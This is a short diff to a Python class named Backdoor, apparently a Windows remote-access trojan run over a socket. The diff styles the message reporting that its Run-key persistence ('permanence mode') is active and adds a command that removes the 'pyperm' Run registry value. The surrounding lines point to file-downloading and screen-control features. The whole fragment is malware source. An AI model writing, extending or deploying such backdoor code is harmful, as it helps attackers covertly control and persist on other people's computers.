@@ -3,6 +3,7 @@ import subprocess
 import sys
 import os
 import platform
+from winreg import OpenKey
 import requests
 import re
 import pyautogui
@@ -130,11 +131,26 @@ class Backdoor:
                             
                             # Closing 
                             reg.CloseKey(open)
-                            self.sock.send("Permanence mode activated!".encode())
+                            self.sock.send("\033[1;32m[+]\033[0;0m Permanence mode activated!".encode("latin1"))
 
 
                         except Exception as exc:
                             self.sock.send(str(exc).encode())
+
+                    if message_command_descrypt == "disable_permanence":
+                        self.sock.send("\033[31m[-] *\033[0;0m Desativating permanence mode...".encode())
+                        try:
+                            import winreg as reg
+                            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
+                            reg.DeleteValue(key, "pyperm")
+                            reg.CloseKey(key)
+
+                        except FileNotFoundError:
+                            pass
+
+                        except Exception as e:
+                            self.sock.send(str(e).encode())
+                        self.sock.send("\033[1;32m[+]\033[0;0m Disabled with success".encode())
                         # except
                     # Downloading files
 
